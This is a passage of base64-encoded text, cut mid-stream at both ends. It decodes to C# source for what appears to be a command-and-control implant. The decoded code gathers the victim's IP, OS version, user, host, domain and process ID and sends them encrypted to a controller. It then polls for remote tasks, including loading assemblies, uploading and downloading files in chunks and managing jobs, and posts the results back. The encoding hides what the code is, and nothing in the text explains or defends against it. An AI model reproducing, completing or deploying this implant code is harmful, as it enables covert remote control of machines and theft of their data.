lKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gSm9iLmNodW5rX251bSkgJiAoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5jaHVua2luZ19zdGFydGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkVGFza2luZyBVcGxvYWRUYXNraW5nID0gVXRpbHMuVXBsb2FkVGFza2luZy5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5maWxlX2lkID0gVXBsb2FkVGFza2luZy5hc3NlbWJseV9pZDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBVcGxvYWRUYXNraW5nLnJlbW90ZV9wYXRoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgVXBsb2FkID0gbmV3IFV0aWxzLlVwbG9hZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAidXBsb2FkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX3NpemUgPSBDb25maWcuQ2h1bmtTaXplLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZFJlc3BvbnNlIFVwbG9hZFJlc3BvbnNlID0gSHR0cC5HZXRVcGxvYWQoVXBsb2FkKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IFVwbG9hZFJlc3BvbnNlLnRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQoVXBsb2FkUmVzcG9uc2UuY2h1bmtfZGF0YSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua2luZ19zdGFydGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rX251bSsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWQgQ2h1bmtVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfc2l6ZSA9IENvbmZpZy5DaHVua1NpemUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gSm9iLnBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBIdHRwLkdldFVwbG9hZChDaHVua1VwbG9hZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKFVwbG9hZFJlc3BvbnNlLmNodW5rX2RhdGEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBVdGlscy5HZXRUYXNraW5nIEdldFRhc2tpbmcgPSBuZXcgVXRpbHMuR2V0VGFza2luZw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gImdldF90YXNraW5nIiwNCiAgICAgICAgICAgICAgICAgICAgdGFza2luZ19zaXplID0gMw0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCArIFV0aWxzLkdldFRhc2tpbmcuVG9Kc29uKEdldFRhc2tpbmcpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuR2V0VGFza2luZy5Ub0pzb24oR2V0VGFza2luZykpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBpZiAoZmluYWxfcmVzdWx0LlN1YnN0cmluZygwLCAzNikgIT0gQ29uZmlnLlVVSUQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFV0aWxzLkdldFRhc2tpbmdSZXNwb25zZSBHZXRUYXNrUmVzcG9uc2UgPSBVdGlscy5HZXRUYXNraW5nUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGlmIChHZXRUYXNrUmVzcG9uc2UudGFza3NbMF0uY29tbWFuZCA9PSAiIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuVGFzayB0YXNrIGluIEdldFRhc2tSZXNwb25zZS50YXNrcykgew0KICAgICAgICAgICAgICAgICAgICBVdGlscy5Kb2IgSm9iID0gbmV3IFV0aWxzLkpvYg0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBqb2JfaWQgPSBKb2JMaXN0LmpvYl9jb3VudCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSB0YXNrLmlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBqb2Jfc3RhcnRlZCA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRhc2suY29tbWFuZCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB0YXNrLnBhcmFtZXRlcnMsDQogICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSAwDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IiB8fCBKb2IuY29tbWFuZCA9PSAidXBsb2FkIikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnVwbG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0gPSAxOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJkb3dubG9hZCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5kb3dubG9hZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNvbW1hbmQgPT0gImpvYnMiKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSBNb2R1bGVzLkdldEpvYnMoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY29tbWFuZCA9PSAiam9ia2lsbCIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNb2R1bGVzLktpbGxKb2IoSm9iTGlzdCwgSW50MzIuUGFyc2UoSm9iLnBhcmFtZXRlcnMpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkpvYiBzdWNjZXNzZnVsbHkgcmVtb3ZlZCI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSAiQ291bGQgbm90IHJlbW92ZSBqb2IiOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIEpvYkxpc3Quam9icy5BZGQoSm9iKTsNCiAgICAgICAgICAgICAgICAgICAgKytKb2JMaXN0LmpvYl9jb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgVXRpbHMuVXBsb2FkUmVzcG9uc2UgR2V0VXBsb2FkKFV0aWxzLlVwbG9hZCBVcGxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFQNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlVVSUQgKyBVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdChVdGlscy5VcGxvYWQuVG9Kc29uKFVwbG9hZCkpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcocmVzdWx0KSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRSZXNwb25zZSBVcGxvYWRSZXNwb25zZSA9IFV0aWxzLlVwbG9hZFJlc3BvbnNlLkZyb21Kc29uKGZpbmFsX3Jlc3VsdC5TdWJzdHJpbmcoMzYpKTsNCg0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVXRpbHMuVXBsb2FkUmVzcG9uc2UgVXBsb2FkUmVzcG9uc2UgPSBuZXcgVXRpbHMuVXBsb2FkUmVzcG9uc2UgeyB9Ow0KICAgICAgICAgICAgICAgIHJldHVybiBVcGxvYWRSZXNwb25zZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBQb3N0UmVzcG9uc2UoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5Qb3N0UmVzcG9uc2UgUG9zdFJlc3BvbnNlID0gbmV3IFV0aWxzLlBvc3RSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInBvc3RfcmVzcG9uc2UiLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSB7IH0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jb21wbGV0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIUpvYi5zdWNjZXNzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gImVycm9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcGxldGVkID0gImZhbHNlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBKb2IucmVzcG9uc2UsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gSm9iLnRvdGFsX2NodW5rcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IEpvYi5wYXRoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuVGFza1Jlc3BvbnNlIFRhc2tSZXNwb25zZSA9IG5ldyBVdGlscy5UYXNrUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IEpvYi50YXNrX2lkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcl9vdXRwdXQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9ICJ0cnVlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBKb2IuY2h1bmtzWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI